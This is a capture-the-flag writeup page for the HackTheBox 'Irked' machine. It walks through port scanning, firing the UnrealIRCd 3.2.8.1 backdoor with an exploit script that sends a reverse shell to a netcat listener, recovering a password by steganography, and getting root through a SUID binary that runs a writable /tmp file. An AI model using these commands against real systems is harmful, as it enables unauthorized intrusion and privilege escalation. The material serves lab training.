@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/irked.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Irked - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux</span>
+                </div>
+
+                <h1>Irked</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Irked</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Linux</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">unrealircd 3.2.8.1 backdoor (cve-2010-2075)</span>
+                    <span class="tag">steghide credential recovery</span>
+                    <span class="tag">suid binary command injection</span>
+                    <span class="tag">relative path hijack</span>
+                </div>
+
+                <img src="../../images/hackthebox/irked/index.png" alt="Irked Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Alongside SSH and Apache, there are three ports serving <strong>UnrealIRCd</strong> (6697, 8067, 65534) plus rpcbind.</p>
+
+                <pre><code>[irked] nmap -Pn -sSVC -p- -T5 --min-rate 2000 -v -oN nmap 10.129.71.144
+Nmap scan report for 10.129.71.144
+Host is up (0.15s latency).
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+6697/tcp  open  irc     UnrealIRCd
+8067/tcp  open  irc     UnrealIRCd
+46273/tcp open  status  1 (RPC #100024)
+65534/tcp open  irc     UnrealIRCd
+Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Port 80 is a near-empty Apache page (only <code>/manual</code> is present), so I added <code>irked.htb</code> to <code>/etc/hosts</code> and pivoted to the IRC daemon. Connecting raw with <code>nc</code> and registering a nick prints the exact version:</p>
+
+                <pre><code>[irked] nc irked.htb 6697
+:irked.htb NOTICE AUTH :*** Looking up your hostname...
+NICK jk
+USER jk 0 * myname
+:irked.htb 001 jk :Welcome to the ROXnet IRC Network jk!jk@10.10.14.172
+:irked.htb 002 jk :Your host is irked.htb, running version Unreal3.2.8.1</code></pre>
+
+                <h2>Exploitation</h2>
+
+                <p>Unreal3.2.8.1 is the release that shipped with a backdoor in its source tree, <a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2075">CVE-2010-2075</a>. The tainted code passes any data sent after the token <code>AB;</code> straight to <code>system()</code>, so any client can run shell commands on the server before authenticating.</p>
+
+                <p>I used <code>exploit2.py</code>, which opens a socket to the IRC port and sends <code>AB;</code> followed by a Perl reverse shell pointed back at my listener. With <code>nc</code> waiting on 4444, running it fires the backdoor:</p>
+
+                <pre><code>[irked] python3 exploit2.py irked.htb 6697 10.10.14.172 4444</code></pre>
+
+                <pre><code>[irked] nc -lvnp 4444
+ircd@irked:/home/djmardov/Documents$ id
+uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>The shell lands as <code>ircd</code>. In <code>djmardov</code>'s <code>Documents</code> folder there is a hidden <code>.backup</code> file. It is not a login password but a passphrase, and the wording hints at steganography:</p>
+
+                <pre><code>ircd@irked:/home/djmardov/Documents$ cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss</code></pre>
+
+                <p>Port 80 served an image, <code>irked.jpg</code>. Running <code>steghide</code> against it with that passphrase extracts an embedded file:</p>
+
+                <pre><code>[irked] steghide extract -sf irked.jpg
+Enter passphrase: UPupDOWNdownLRlrBAbaSSss
+wrote extracted data to "pass.txt".
+[irked] cat pass.txt
+Kab6h+m+bbp2J:HG</code></pre>
+
+                <p>That string is <code>djmardov</code>'s password. It works over SSH (or a simple <code>su</code>), giving a real session and the user flag:</p>
+
+                <pre><code>[irked] ssh djmardov@irked.htb
+djmardov@irked.htb's password: Kab6h+m+bbp2J:HG
+djmardov@irked:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Searching for SUID binaries turns up a non-standard one, <code>/usr/bin/viewuser</code>, owned by root:</p>
+
+                <pre><code>djmardov@irked:/tmp$ find / -perm /4000 2>/dev/null | xargs ls -la
+...
+-rwsr-xr-x 1 root   root          7328 May 16  2018 /usr/bin/viewuser
+...</code></pre>
+
+                <p>Running it prints a banner and the logged-in users, then tries to execute <code>/tmp/listusers</code> and fails because the file does not exist:</p>
+
+                <pre><code>djmardov@irked:/tmp$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2026-01-23 09:09 (:0)
+djmardov pts/1        2026-01-23 10:05 (10.10.14.172)
+sh: 1: /tmp/listusers: not found</code></pre>
+
+                <p>The binary invokes <code>/tmp/listusers</code> with the SUID root privileges and never validates its contents, so whatever I put in that file runs as root. I confirmed with <code>id</code>, then swapped in a command to read the flag:</p>
+
+                <pre><code>djmardov@irked:/tmp$ echo 'id' > /tmp/listusers
+djmardov@irked:/tmp$ chmod 777 /tmp/listusers
+djmardov@irked:/tmp$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2026-01-23 09:09 (:0)
+djmardov pts/1        2026-01-23 10:05 (10.10.14.172)
+uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),...
+
+djmardov@irked:/tmp$ echo 'cat /root/root.txt' > /tmp/listusers
+djmardov@irked:/tmp$ /usr/bin/viewuser</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Irked</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
